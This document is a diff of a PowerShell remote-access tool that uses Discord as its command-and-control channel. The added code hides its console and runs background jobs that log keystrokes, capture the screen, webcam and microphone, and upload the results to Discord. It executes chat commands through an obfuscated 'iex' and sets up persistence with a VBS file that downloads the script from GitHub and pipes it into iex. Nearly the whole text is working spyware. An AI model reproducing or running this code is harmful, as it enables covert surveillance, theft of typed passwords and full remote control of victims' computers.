-$systemLocale = Get-WinSystemLocale;$systemLanguage = $systemLocale.Name
-$computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
-$script:jsonPayload = @{
-    username   = $env:COMPUTERNAME
-    tts        = $false
-    embeds     = @(
-        @{
-            title       = "$env:COMPUTERNAME | Computer Information "
-            "description" = @"
-``````SYSTEM INFORMATION FOR $env:COMPUTERNAME``````
-:man_detective: **User Information** :man_detective:
-- **Current User**          : ``$env:USERNAME``
-- **Email Address**         : ``$email``
-- **Language**              : ``$systemLanguage``
-- **Administrator**         : ``$adminperm``
-
-:minidisc: **OS Information** :minidisc:
-- **Current OS**            : ``$OSString - $ver``
-- **Architechture**         : ``$OSArch``
-
-:globe_with_meridians: **Network Information** :globe_with_meridians:
-- **Public IP Address**     : ``$computerPubIP``
-
-:desktop: **Hardware Information** :desktop:
-- **Processor**             : ``$processor`` 
-- **Memory**                : ``$RamInfo``
-- **Gpu**                   : ``$gpu``
-- **Screen Size**           : ``$screensize``
-"@
-            color       = 65280
+# Scriptblock for PS console in discord
+$doPowershell = {
+param([string]$token,[string]$PowershellID)
+    sleep 5
+    $url = "https://discord.com/api/v10/channels/$PowershellID/messages"
+    $w = New-Object System.Net.WebClient
+    $w.Headers.Add("Authorization", "Bot $token")
+    function senddir{
+        $dir = $PWD.Path
+        $w.Headers.Add("Content-Type", "application/json")
+        $j = @{"content" = "``PS | $dir >``"} | ConvertTo-Json
+        $x = $w.UploadString($url, "POST", $j)
+    }
+    senddir
+    while($true){
+        $msg = $w.DownloadString($url)
+        $r = ($msg | ConvertFrom-Json)[0]
+        if(-not $r.author.bot){
+            $a = $r.timestamp
+            $msg = $r.content
         }
-    )
-}
-sendMsg -Embed $jsonPayload
+        if($a -ne $p){
+            $p = $a
+            $out = &($env:CommonProgramW6432[12],$env:ComSpec[15],$env:ComSpec[25] -Join $()) $msg
+            $resultLines = $out -split "`n"
+            $currentBatchSize = 0
+            $batch = @()
+            foreach ($line in $resultLines) {
+                $lineSize = [System.Text.Encoding]::Unicode.GetByteCount($line)
+                if (($currentBatchSize + $lineSize) -gt 1900) {
+                    $w.Headers.Add("Content-Type", "application/json")
+                    $j = @{"content" = "``````$($batch -join "`n")``````"} | ConvertTo-Json
+                    $x = $w.UploadString($url, "POST", $j)
+                    sleep 1
+                    $currentBatchSize = 0
+                    $batch = @()
+                }
+                $batch += $line
+                $currentBatchSize += $lineSize
+            }
+            if ($batch.Count -gt 0) {
+                $w.Headers.Add("Content-Type", "application/json")
+                $j = @{"content" = "``````$($batch -join "`n")``````"} | ConvertTo-Json
+                $x = $w.UploadString($url, "POST", $j)
+            }
+            senddir
+        }
+        sleep 3
+    }
 }
 
-Function WaitingMsg {
-$script:jsonPayload = @{
-    username   = $env:COMPUTERNAME
-    tts        = $false
-    embeds     = @(
-        @{
-            title       = ":hourglass: $env:COMPUTERNAME | Waiting to connect :hourglass:"
-            "description" = @"
-Enter **$env:COMPUTERNAME** in chat to start the session     
-"@
-            color       = 16776960
-            footer      = @{
-                text = "$timestamp"
+$doKeyjob = {
+param([string]$token,[string]$keyID)
+    sleep 5
+    $script:token = $token
+    function sendMsg {
+    param([string]$Message)
+    $url = "https://discord.com/api/v10/channels/$keyID/messages"
+    $wc = New-Object System.Net.WebClient
+    $wc.Headers.Add("Authorization", "Bot $token")
+    if ($Message) {
+            $jsonBody = @{
+                "content" = "$Message"
+                "username" = "$env:computername"
+            } | ConvertTo-Json
+            $wc.Headers.Add("Content-Type", "application/json")
+            $response = $wc.UploadString($url, "POST", $jsonBody)
+	        $message = $null
+        }
+    }
+    Function Kservice {   
+        sendMsg -Message ":mag_right: ``Keylog Started`` :mag_right:"
+        $API = '[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] public static extern short GetAsyncKeyState(int virtualKeyCode); [DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int GetKeyboardState(byte[] keystate);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int MapVirtualKey(uint uCode, int uMapType);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);'
+        $API = Add-Type -M $API -Name 'Win32' -Names API -PassThru
+        $pressed = [System.Diagnostics.Stopwatch]::StartNew()
+        # Change for frequency
+        $maxtime = [TimeSpan]::FromSeconds(10)
+        $strbuild = New-Object -TypeName System.Text.StringBuilder 
+        While ($true){
+            $down = $false
+            try{
+            while ($pressed.Elapsed -lt $maxtime) {
+                Start-Sleep -Milliseconds 30
+                for ($capture = 8; $capture -le 254; $capture++){
+                $keyst = $API::GetAsyncKeyState($capture)
+                    if ($keyst -eq -32767) {
+                    $down = $true
+                    $pressed.Restart()
+                    $null = [console]::CapsLock
+                    $vtkey = $API::MapVirtualKey($capture, 3)
+                    $kbst = New-Object Byte[] 256
+                    $checkkbst = $API::GetKeyboardState($kbst)
+                             
+                        if ($API::ToUnicode($capture, $vtkey, $kbst, $strbuild, $strbuild.Capacity, 0)) {
+                        $collected = $strbuild.ToString()
+                            if ($capture -eq 27) {$collected = "[ESC]"}
+                            if ($capture -eq 8) {$collected = "[BACK]"}
+                            if ($capture -eq 13) {$collected = "[ENT]"}
+                            $keymem += $collected 
+                            }
+                        }
+                    }
+                }
+            }
+            finally{
+                If ($down) {
+                    $escmsgsys = $keymem -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
+                    sendMsg -Message ":mag_right: ``Keys Captured :`` $escmsgsys"
+                    $down = $false
+                    $keymem = ""
+                }
+            }
+        $pressed.Restart()
+        Start-Sleep -Milliseconds 10
+        }
+    }Kservice
+}
+
+# Scriptblock for microphone input to discord
+$audiojob = {
+    param ([string]$token,[string]$MicrophoneID,[string]$MicrophoneWebhook)
+    function sendFile {
+        param([string]$sendfilePath)
+        $url = "https://discord.com/api/v10/channels/$MicrophoneID/messages"
+        $wc = New-Object System.Net.WebClient
+        $wc.Headers.Add("Authorization", "Bot $token")
+        if ($sendfilePath) {
+            if (Test-Path $sendfilePath -PathType Leaf) {
+                $response = $wc.UploadFile($url, "POST", $sendfilePath)
+                if ($MicrophoneWebhook){
+                    $hooksend = $wc.UploadFile($MicrophoneWebhook, "POST", $sendfilePath)
+                }
             }
         }
-    )
+    }
+    $outputFile = "$env:Temp\Audio.mp3"
+    Add-Type '[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDevice {int a(); int o();int GetId([MarshalAs(UnmanagedType.LPWStr)] out string id);}[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDeviceEnumerator {int f();int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);}[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }public static string GetDefault (int direction) {var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;IMMDevice dev = null;Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(direction, 1, out dev));string id = null;Marshal.ThrowExceptionForHR(dev.GetId(out id));return id;}' -name audio -Namespace system
+    function getFriendlyName($id) {
+        $reg = "HKLM:\SYSTEM\CurrentControlSet\Enum\SWD\MMDEVAPI\$id"
+        return (get-ItemProperty $reg).FriendlyName
+    }
+    $id1 = [audio]::GetDefault(1)
+    $MicName = "$(getFriendlyName $id1)"
+    while($true){
+        .$env:Temp\ffmpeg.exe -f dshow -i audio="$MicName" -t 60 -c:a libmp3lame -ar 44100 -b:a 128k -ac 1 $outputFile
+        sendFile -sendfilePath $outputFile | Out-Null
+        sleep 1
+        rm -Path $outputFile -Force
+    }
 }
-sendMsg -Embed $jsonPayload
+
+# Scriptblock for desktop screenshots to discord
+$screenJob = {
+    param ([string]$token,[string]$ScreenshotID,[string]$ScreenshotWebhook)
+    function sendFile {
+        param([string]$sendfilePath)
+        $url = "https://discord.com/api/v10/channels/$ScreenshotID/messages"
+        $wc = New-Object System.Net.WebClient
+        $wc.Headers.Add("Authorization", "Bot $token")
+        if ($sendfilePath) {
+            if (Test-Path $sendfilePath -PathType Leaf) {
+                $response = $wc.UploadFile($url, "POST", $sendfilePath)
+                if ($ScreenshotWebhook){
+                    $hooksend = $wc.UploadFile($ScreenshotWebhook, "POST", $sendfilePath)
+                }
+            }
+        }
+    }
+    while($true){
+        $mkvPath = "$env:Temp\Screen.jpg"
+        .$env:Temp\ffmpeg.exe -f gdigrab -i desktop -frames:v 1 -vf "fps=1" $mkvPath
+        sendFile -sendfilePath $mkvPath | Out-Null
+        sleep 5
+        rm -Path $mkvPath -Force
+        sleep 1
+    }
 }
+
+# Scriptblock for webcam screenshots to discord
+$camJob = {
+    param ([string]$token,[string]$WebcamID,[string]$WebcamWebhook)    
+    function sendFile {
+        param([string]$sendfilePath)
+        $url = "https://discord.com/api/v10/channels/$WebcamID/messages"
+        $wc = New-Object System.Net.WebClient
+        $wc.Headers.Add("Authorization", "Bot $token")
+        if ($sendfilePath) {
+            if (Test-Path $sendfilePath -PathType Leaf) {
+                $response = $wc.UploadFile($url, "POST", $sendfilePath)
+                if ($WebcamWebhook){
+                    $hooksend = $wc.UploadFile($WebcamWebhook, "POST", $sendfilePath)
+                }
+            }
+        }
+    }
+    $imagePath = "$env:Temp\Image.jpg"
+    $Input = (Get-CimInstance Win32_PnPEntity | ? {$_.PNPClass -eq 'Camera'} | select -First 1).Name
+    if (!($input)){$Input = (Get-CimInstance Win32_PnPEntity | ? {$_.PNPClass -eq 'Image'} | select -First 1).Name}
+    while($true){
+        .$env:Temp\ffmpeg.exe -f dshow -i video="$Input" -frames:v 1 -y $imagePath
+        sendFile -sendfilePath $imagePath | Out-Null
+        sleep 5
+        rm -Path $imagePath -Force
+        sleep 5
+    }
+}
+
+# Function to start all jobs upon script execution
+function StartAll{
+    Start-Job -ScriptBlock $camJob -Name Webcam -ArgumentList $global:token, $global:WebcamID, $global:WebcamWebhook
+    sleep 1
+    Start-Job -ScriptBlock $screenJob -Name Screen -ArgumentList $global:token, $global:ScreenshotID, $global:ScreenshotWebhook
+    sleep 1
+    Start-Job -ScriptBlock $audioJob -Name Audio -ArgumentList $global:token, $global:MicrophoneID, $global:MicrophoneWebhook
+    sleep 1
+    Start-Job -ScriptBlock $doKeyjob -Name Keys -ArgumentList $global:token, $global:keyID
+    sleep 1
+    Start-Job -ScriptBlock $doPowershell -Name PSconsole -ArgumentList $global:token, $global:PowershellID
+}
+
+# ------------------------  FUNCTION CALLS + SETUP  ---------------------------
+
+# Hide the console
+If ($hideconsole -eq 1){ 
+    HideWindow
+}
+# Create category and new channels
+NewChannelCategory
+sleep 1
+NewChannel -name 'session-control'
+$global:SessionID = $ChannelID
+$global:ch = $ChannelID
+sleep 1
+NewChannel -name 'screenshots'
+$global:ScreenshotID = $ChannelID
+sleep 1
+NewChannel -name 'webcam'
+$global:WebcamID = $ChannelID
+sleep 1
+NewChannel -name 'microphone'
+$global:MicrophoneID = $ChannelID
+sleep 1
+NewChannel -name 'keycapture'
+$global:keyID = $ChannelID
+sleep 1
+NewChannel -name 'powershell'
+$global:PowershellID = $ChannelID
+sleep 1
+# Download ffmpeg to temp folder
+$Path = "$env:Temp\ffmpeg.exe"
+If (!(Test-Path $Path)){  
+    GetFfmpeg
+}
+# Start all functions upon running the script
+If ($defaultstart -eq 1){ 
+    StartAll
+}
+
+# Send setup complete message to discord
+sendMsg -Message ":white_check_mark: ``$env:COMPUTERNAME Setup Complete!`` :white_check_mark:"
+
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------
 
 Function CloseMsg {
 $script:jsonPayload = @{
@@ -1218,123 +1544,6 @@ sendMsg -Embed $jsonPayload
     }
 }
 
-function PullMsg {
-    $headers = @{
-        'Authorization' = "Bot $token"
-    }
-    $webClient = New-Object System.Net.WebClient
-    $webClient.Headers.Add("Authorization", $headers.Authorization)
-    $response = $webClient.DownloadString("https://discord.com/api/v9/channels/$chan/messages")
-    if ($response) {
-        $most_recent_message = ($response | ConvertFrom-Json)[0]
-        if (-not $most_recent_message.author.bot) {
-            $response = $most_recent_message.content
-            $attachments = $most_recent_message.attachments
-           if ($response -eq 'download' -and $attachments) {
-                $attachment_url = $attachments[0].url
-                $file_name = [System.IO.Path]::GetFileName($attachment_url)
-                $file_name = $file_name.Split('?')[0]
-                Write-Host "Downloading File : $file_name"
-                $webClient.DownloadFile($attachment_url, $file_name)
-            }
-            $script:response = $response
-            $script:messages = $response
-        }
-    } else {
-        Write-Output "No messages found in the channel."
-    }
-}
-
-function sendMsg {
-    param(
-        [string]$Message,
-        [string]$Embed
-    )
-
-    $url = "https://discord.com/api/v9/channels/$chan/messages"
-    $webClient = New-Object System.Net.WebClient
-    $webClient.Headers.Add("Authorization", "Bot $token")
-    $dir = $PWD.Path
-
-    if ($Embed) {
-        $jsonBody = $jsonPayload | ConvertTo-Json -Depth 10 -Compress
-        $webClient.Headers.Add("Content-Type", "application/json")
-        $response = $webClient.UploadString($url, "POST", $jsonBody)
-        Write-Host "Embed sent to Discord"
-        $jsonPayload = $null
-    }
-    if ($Message) {
-            $jsonBody = @{
-                "content" = "$Message"
-                "username" = "$dir"
-            } | ConvertTo-Json
-            $webClient.Headers.Add("Content-Type", "application/json")
-            $response = $webClient.UploadString($url, "POST", $jsonBody)
-            Write-Host "Message sent to Discord"
-	    $message = $null
-    }
-}
-
-
-function sendFile {
-    param(
-        [string]$sendfilePath
-    )
-
-    $url = "https://discord.com/api/v9/channels/$chan/messages"
-    $webClient = New-Object System.Net.WebClient
-    $webClient.Headers.Add("Authorization", "Bot $token")
-    if ($sendfilePath) {
-        if (Test-Path $sendfilePath -PathType Leaf) {
-            $response = $webClient.UploadFile($url, "POST", $sendfilePath)
-            Write-Host "Attachment sent to Discord: $sendfilePath"
-        } else {
-            Write-Host "File not found: $sendfilePath"
-            Send-Discord ('File not found: `' + $sendfilePath + '`')
-        }
-    }
-}
-
-Function GetFfmpeg{
-    sendMsg -Message ":mag_right: ``Downloading FFmpeg to Client..`` :mag_right:"
-    $Path = "$env:Temp\ffmpeg.exe"
-    If (!(Test-Path $Path)){  
-        $tempDir = "$env:temp"
-        $apiUrl = "https://api.github.com/repos/GyanD/codexffmpeg/releases/latest"
-        $wc = New-Object System.Net.WebClient           
-        $wc.Headers.Add("User-Agent", "PowerShell")
-        $response = $wc.DownloadString("$apiUrl")
-        $release = $response | ConvertFrom-Json
-        $asset = $release.assets | Where-Object { $_.name -like "*essentials_build.zip" }
-        $zipUrl = $asset.browser_download_url
-        $zipFilePath = Join-Path $tempDir $asset.name
-        $extractedDir = Join-Path $tempDir ($asset.name -replace '.zip$', '')
-        $wc.DownloadFile($zipUrl, $zipFilePath)
-        Expand-Archive -Path $zipFilePath -DestinationPath $tempDir -Force
-        Move-Item -Path (Join-Path $extractedDir 'bin\ffmpeg.exe') -Destination $tempDir -Force
-        rm -Path $zipFilePath -Force
-        rm -Path $extractedDir -Recurse -Force
-    }
-    sendMsg -Message ":white_check_mark: ``Download Complete`` :white_check_mark:"
-}
-
-Function HideConsole{
-    If ($HideWindow -gt 0){
-    $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
-    $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
-    $hwnd = (Get-Process -PID $pid).MainWindowHandle
-        if($hwnd -ne [System.IntPtr]::Zero){
-            $Type::ShowWindowAsync($hwnd, 0)
-        }
-        else{
-            $Host.UI.RawUI.WindowTitle = 'hideme'
-            $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
-            $hwnd = $Proc.MainWindowHandle
-            $Type::ShowWindowAsync($hwnd, 0)
-        }
-    }
-}
-
 Function VersionCheck {
     $versionCheck = irm -Uri "https://pastebin.com/raw/3axupAKL"
     $VBpath = "C:\Windows\Tasks\service.vbs"
@@ -1347,7 +1556,7 @@ Function VersionCheck {
             $tobat = @"
 Set WshShell = WScript.CreateObject(`"WScript.Shell`")
 WScript.Sleep 200
-WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tk='$token'; `$ch='$chan'; irm https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1 | iex`", 0, True
+WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tk='$token'; irm https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1 | iex`", 0, True
 "@
             $tobat | Out-File -FilePath $VBpath -Force
             sleep 1
@@ -1357,138 +1566,85 @@ WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tk='$token'; `$ch=
     }
 }
 
-Function Authenticate{
-    if (($response -like "$env:COMPUTERNAME") -or ($response -like "$env:COMPUTERNAME*") -or ($response -like "ControlAll")) {
-        Write-Host "Authenticated $env:COMPUTERNAME"
-        $script:authenticated = 1
-        $script:previouscmd = $response
-        if (($response -like "ControlAll") -or ($response -like "$env:COMPUTERNAME -nonew")){
-            $spawnChannels = 0
-        }
-        if ($spawnChannels -eq 1){
-            NewChannel
-        }
-        ConnectMsg
-    }
-    else{
-        Write-Host "$env:COMPUTERNAME Not authenticated"
-        $script:authenticated = 0
-        $script:previouscmd = $response
-    } 
-}
-
-Function getGuildID{
-
-$headers = @{
-    'Authorization' = "Bot $token"
-}
-    $webClient = New-Object System.Net.WebClient
-    $webClient.Headers.Add("Authorization", $headers.Authorization)
-    $response = $webClient.DownloadString("https://discord.com/api/v9/channels/$chan")
-    $channel_info = $response | ConvertFrom-Json
-    $script:gid = $channel_info.guild_id
-}
-
-Function NewChannel{
-    $script:oldChan = $chan
-    $uri = "https://discord.com/api/guilds/$gid/channels"
-    $body = @{
-        "name" = "session-$env:COMPUTERNAME"
-        "type" = 0
-    } | ConvertTo-Json
-    
-    $webClient = New-Object System.Net.WebClient
-    $webClient.Headers.Add("Authorization", "Bot $token")
-    $webClient.Headers.Add("Content-Type", "application/json")
-    $response = $webClient.UploadString($uri, "POST", $body)
-    $responseObj = ConvertFrom-Json $response
-    Write-Host "The ID of the new channel is: $($responseObj.id)"
-    $script:chan = $responseObj.id
-}
 # =============================================================== MAIN LOOP =========================================================================
 
-HideConsole
-$connected = 0
-while($connected -eq 0){
-    try{
-	PullMsg
-        $previouscmd = $response
-        VersionCheck
-        GetGuildId
-        WaitingMsg
- 	sleep 1
-        $connected = 1
-    }
-    catch{
-    	sleep 5
-    }
-}
+VersionCheck
+ConnectMsg
 
-while($true){
-    PullMsg
-    if (!($response -like "$previouscmd")) {
-        Write-Output "Command found!"
-        if($authenticated -ne 1){
-            if ($response -like "ShowAll") {
-	    	$previouscmd = $response   
-    		sendMsg -Message "``````Session Waiting : $env:COMPUTERNAME``````"
-     	    }
-     	}
-        if($authenticated -eq 1){
-            if ($response -like "close") {
-                $previouscmd = $response        
-                CloseMsg
-                break
-            }
-            if ($response -like "Pause") {
-                $script:authenticated = 0
-                $previouscmd = $response
-                $InfoOnConnect = 0
-                $script:chan = $oldchan
-                sendMsg -Message ":pause_button: ``Session Paused..`` :pause_button:"
-                WaitingMsg
-            }
-	    if ($response -like "Download") {
-                $previouscmd = $response
-            }
-            elseif (!($response -like "$previouscmd")) {
-                $Result = ie`x($response) -ErrorAction Stop
-                if (($result.length -eq 0) -or ($result -contains "public_flags") -or ($result -contains "                                           ")) {
-                    $script:previouscmd = $response
-                    sendMsg -Message ":white_check_mark:  ``Command Sent``  :white_check_mark:"
-                    sleep -m 250
-                    $dir = $PWD.Path
-                    sendMsg -Message "``PS | $dir>``"
-                }
-                else {
-                    $script:previouscmd = $response
-                    $resultLines = $Result -split "`n"
-                    $maxBatchSize = 1900
-                    $currentBatchSize = 0
-                    $batch = @()
-                    foreach ($line in $resultLines) {
-                        $lineSize = [System.Text.Encoding]::Unicode.GetByteCount($line)
-                        if (($currentBatchSize + $lineSize) -gt $maxBatchSize) {
-                            sendMsg -Message "``````$($batch -join "`n")``````"
-                            sleep -m 400
-                            $currentBatchSize = 0
-                            $batch = @()
-                        }
-                        $batch += $line
-                        $currentBatchSize += $lineSize
-                    }
-                    if ($batch.Count -gt 0) {
-                        sendMsg -Message "``````$($batch -join "`n")``````"
-                        sleep -m 250
-                    }
-                    $dir = $PWD.Path
-                    sendMsg -Message "``PS | $dir>``"
-                }
-            }
-        }
-        else{
-            Authenticate
-        }
+while ($true) {
+
+    $headers = @{
+        'Authorization' = "Bot $token"
     }
-    sleep 5
+    $wc = New-Object System.Net.WebClient
+    $wc.Headers.Add("Authorization", $headers.Authorization)
+    $messages = $wc.DownloadString("https://discord.com/api/v10/channels/$SessionID/messages")
+    $most_recent_message = ($messages | ConvertFrom-Json)[0]
+    if (-not $most_recent_message.author.bot) {
+        $latestMessageId = $most_recent_message.timestamp
+        $messages = $most_recent_message.content
+    }
+    if ($latestMessageId -ne $lastMessageId) {
+        $lastMessageId = $latestMessageId
+        $global:latestMessageContent = $messages
+        $camrunning = Get-Job -Name Webcam
+        $sceenrunning = Get-Job -Name Screen
+        $audiorunning = Get-Job -Name Audio
+        $PSrunning = Get-Job -Name PSconsole
+        if ($messages -eq 'webcam'){
+            if (!($camrunning)){
+                Start-Job -ScriptBlock $camJob -Name Webcam -ArgumentList $global:token, $global:WebcamID
+                sendMsg -Message ":camera: ``$env:COMPUTERNAME Webcam Session Started!`` :camera:"
+            }
+            else{sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:"}
+        }
+        if ($messages -eq 'screenshots'){
+            if (!($sceenrunning)){
+                Start-Job -ScriptBlock $screenJob -Name Screen -ArgumentList $global:token, $global:ScreenshotID
+                sendMsg -Message ":desktop: ``$env:COMPUTERNAME Screenshot Session Started!`` :desktop:"
+            }
+            else{sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:"}
+        }
+        if ($messages -eq 'psconsole'){
+            if (!($PSrunning)){
+                Start-Job -ScriptBlock $doPowershell -Name PSconsole -ArgumentList $global:token, $global:PowershellID
+                sendMsg -Message ":white_check_mark: ``$env:COMPUTERNAME PS Session Started!`` :white_check_mark:"
+            }
+            else{sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:"}
+        }
+        if ($messages -eq 'microphone'){
+            if (!($audiorunning)){
+                Start-Job -ScriptBlock $audioJob -Name Audio -ArgumentList $global:token, $global:MicrophoneID
+                sendMsg -Message ":microphone2: ``$env:COMPUTERNAME Microphone Session Started!`` :microphone2:"
+            }
+            else{sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:"}
+        }
+        if ($messages -eq 'keycapture'){
+            if (!($audiorunning)){
+                Start-Job -ScriptBlock $doKeyjob -Name Keys -ArgumentList $global:token, $global:keyID
+                sendMsg -Message ":microphone2: ``$env:COMPUTERNAME Keycapture Session Started!`` :microphone2:"
+            }
+            else{sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:"}
+        }
+        if ($messages -eq 'pausejobs'){
+            Stop-Job -Name Audio
+            Stop-Job -Name Screen
+            Stop-Job -Name Webcam
+            Stop-Job -Name PSconsole
+            Stop-Job -Name Keys
+            Remove-Job -Name Audio
+            Remove-Job -Name Screen
+            Remove-Job -Name Webcam
+            Remove-Job -Name PSconsole
+            Remove-Job -Name Keys
+            sendMsg -Message ":no_entry: ``Stopped All Jobs! : $env:COMPUTERNAME`` :no_entry:"   
+        }
+        if ($messages -eq 'close'){
+            CloseMsg
+            sleep 2
+            exit      
+        }
+        else{&($env:CommonProgramW6432[12],$env:ComSpec[15],$env:ComSpec[25] -Join $())($messages) -ErrorAction Stop}
+    }
+    Sleep 3
 }
